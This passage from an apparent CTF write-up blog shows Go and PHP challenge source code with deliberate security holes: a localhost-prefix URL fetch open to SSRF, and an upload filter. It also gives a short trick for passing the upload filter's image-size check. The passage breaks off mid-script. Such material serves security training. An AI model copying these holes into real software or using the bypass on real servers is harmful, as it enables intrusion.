		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> fi<span class="token punctuation">.</span><span class="token function">IsDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token keyword">if</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			c<span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/"</span><span class="token punctuation">)</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
			files <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
			l<span class="token punctuation">,</span><span class="token boolean">_</span> <span class="token operator">:=</span> f<span class="token punctuation">.</span><span class="token function">Readdir</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
			<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span>i <span class="token operator">:=</span> <span class="token keyword">range</span> l <span class="token punctuation">{</span>
				files <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>files<span class="token punctuation">,</span> i<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">}</span>

			c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
				<span class="token string">"files"</span> <span class="token punctuation">:</span>files<span class="token punctuation">,</span>
			<span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token punctuation">}</span>


	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
		data<span class="token punctuation">,</span><span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
		c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"content-disposition"</span><span class="token punctuation">,</span> <span class="token string">`attachment; filename=`</span> <span class="token operator">+</span> fi<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		c<span class="token punctuation">.</span><span class="token function">Data</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"text/plain"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">uploadController</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">var</span> file File
	<span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"msg"</span><span class="token punctuation">:</span> err<span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	dir <span class="token operator">:=</span> <span class="token function">md5sum</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>Name<span class="token punctuation">)</span>

	<span class="token boolean">_</span><span class="token punctuation">,</span>err<span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"./files"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>dir<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">{</span>
		e <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Mkdir</span><span class="token punctuation">(</span><span class="token string">"./files/"</span><span class="token operator">+</span>dir<span class="token punctuation">,</span>os<span class="token punctuation">.</span>ModePerm<span class="token punctuation">)</span>
		<span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"./files"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>dir<span class="token punctuation">)</span>
		<span class="token keyword">if</span> e <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> e<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span>

		<span class="token punctuation">}</span>

	<span class="token punctuation">}</span>
	filename <span class="token operator">:=</span> <span class="token function">md5sum</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>Content<span class="token punctuation">)</span>
	path <span class="token operator">:=</span> <span class="token string">"./files/"</span><span class="token operator">+</span>dir<span class="token operator">+</span><span class="token string">"/"</span><span class="token operator">+</span>filename
	err <span class="token operator">=</span> ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>Content<span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>ModePerm<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
		<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"file upload succ, path: "</span><span class="token operator">+</span>dir<span class="token operator">+</span><span class="token string">"/"</span><span class="token operator">+</span>filename<span class="token punctuation">,</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">func</span> <span class="token function">vulController</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token keyword">var</span> url Url
	<span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"msg"</span><span class="token punctuation">:</span> err<span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">HasPrefix</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>Url<span class="token punctuation">,</span><span class="token string">"http://127.0.0.1:1234/"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"msg"</span><span class="token punctuation">:</span> <span class="token string">"url forbidden"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	client <span class="token operator">:=</span> <span class="token operator">&amp;</span>http<span class="token punctuation">.</span>Client<span class="token punctuation">{</span>Timeout<span class="token punctuation">:</span> <span class="token number">2</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">}</span>

	resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> client<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>Url<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">defer</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">var</span> buffer <span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token builtin">byte</span>
	result <span class="token operator">:=</span> bytes<span class="token punctuation">.</span><span class="token function">NewBuffer</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">)</span>
	<span class="token keyword">for</span> <span class="token punctuation">{</span>
		n<span class="token punctuation">,</span> err <span class="token operator">:=</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
		result<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> err <span class="token operator">==</span> io<span class="token punctuation">.</span>EOF <span class="token punctuation">{</span>

			<span class="token keyword">break</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"data"</span><span class="token punctuation">:</span> result<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>fileMidderware<span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/vul"</span><span class="token punctuation">,</span>vulController<span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span>uploadController<span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"pong"</span><span class="token punctuation">,</span>
		<span class="token punctuation">}</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span>
	<span class="token boolean">_</span> <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":1234"</span><span class="token punctuation">)</span> <span class="token comment">// listen and serve on 0.0.0.0:8080</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
        <tag>URL重定向</tag>
        <tag>go代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2021Quals-upload</title>
    <url>/posts/1e912fcd.html</url>
    <content><![CDATA[<h1 id="CISCN2021Quals-upload"><a href="#CISCN2021Quals-upload" class="headerlink" title="CISCN2021Quals-upload"></a>CISCN2021Quals-upload</h1><p>知识点概要：文件上传bypass</p>
<p>首页源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string double-quoted-string">"upload"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"这么大个的东西你是想d我吗？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$imageinfo</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"如果不能好好传图片的话就还是不要来打扰我了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"东西不能方方正正的话就很讨厌"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$fileName</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"h"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ph"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"有些东西让你传上去的话那可不得了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$imagePath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"image/"</span> <span class="token operator">.</span> <span class="token function">mb_strtolower</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"postedFile"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$imagePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"upload success, image at <span class="token interpolation"><span class="token variable">$imagePath</span></span>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"传都没有传上去"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>文件大小需小于512KB，需是图片，图片宽高需都为1，文件名不能有字符<code>c、i、h、ph</code>（不区分大小写），相当于过滤了<code>.htaccess</code>、<code>.use.ini</code></p>
<p><code>getimagesize()</code>参考：<a href="https://www.runoob.com/php/php-getimagesize.html">https://www.runoob.com/php/php-getimagesize.html</a></p>
<p>使用如下内容绕过图片宽高需都为1的限制</p>
<pre class="line-numbers language-none"><code class="language-none">#define width 1
#define height 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><code>$_FILES</code>数组参考php官方手册：<a href="https://www.php.net/manual/zh/features.file-upload.post-method.php">https://www.php.net/manual/zh/features.file-upload.post-method.php</a></p>
<pre class="line-numbers language-none"><code class="language-none">$_FILES数组内容如下:
&lt;input name="userfile" type="file" /&gt;
$_FILES['userfile']['size'] 
已上传文件的大小，单位为字节。
$_FILES['userfile']['tmp_name'] 
文件被上传后在服务端储存的临时文件名。
$_FILES['userfile']['name']
客户端机器文件的原名称。
$_FILES['userfile']['type'] 
文件的 MIME 类型，需要浏览器提供该信息的支持，例如“image/gif”。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>目录扫描得到<code>/example.php</code>文件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$name_for_zip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"example/"</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string double-quoted-string">"zip"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"要不咱们再看看？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"都不能解压呢"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"可以解压，我想想存哪里"</span><span class="token punctuation">;</span>
    <span class="token variable">$pos_for_zip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/example/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token variable">$pos_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$pos_for_zip</span></span>/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
